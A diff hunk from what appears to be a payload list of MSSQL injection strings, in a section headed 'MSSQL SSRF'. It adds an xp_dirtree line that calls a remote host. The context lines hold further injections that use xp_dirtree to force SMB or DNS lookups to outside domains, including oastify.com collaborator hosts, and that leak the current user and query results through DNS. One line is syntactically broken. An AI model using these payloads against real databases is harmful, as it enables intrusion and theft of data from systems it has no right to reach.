@@ -42,6 +42,7 @@ EXEC xp_dirtree N' c:\Windows\System32\Drivers\etc\hosts', 10, 1
 [+] MSSQL SSRF
 ==============================================================================
 ';declare @q varchar(99);set @q='\\remotesi'+'te.com\cfz'; exec master.dbo.xp_dirtree @q;-- 
+';exec master ..xp_dirtree '\\remotesite.com\dir'--
 0'; DECLARE @data varchar(1024); SELECT @data = (SELECT user); EXEC('master..xp_dirtree "\\'+@data+'.xxxxxxxxxxxxxxxxxxxxxxxxxxxxx.oastify.com\test$"'); --
 #DNS exfiltration
 ';DECLARE @data varchar(1024);SELECT @data = (SELECT 1 database.dbo.User Limit 1;);declare @q varchar(99);set @q='\\'+@data+'.8tq69edg4mvanyc.oasti'+'fy.com\'; exec master.dbo.xp_dirtree @q;--
